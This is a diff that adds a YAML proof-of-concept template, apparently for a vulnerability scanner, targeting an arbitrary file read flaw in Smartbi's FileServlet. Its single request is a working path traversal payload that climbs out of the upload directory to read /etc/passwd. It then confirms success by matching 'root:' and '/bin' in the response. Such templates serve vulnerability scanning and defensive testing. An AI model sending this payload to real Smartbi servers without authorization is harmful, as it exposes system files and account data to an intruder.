@@ -1,0 +1,19 @@
+id: poc-yaml-smartbi-fileservlet-file-read
+info:
+  name: Smartbi FileServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Smartbi
+variables:
+  r_path: '/smartbi/
+
+    /'
+requests:
+- method: GET
+  path: '{{.r_path}}vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx'
+  expression: 'status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+
+    '
+transport: http
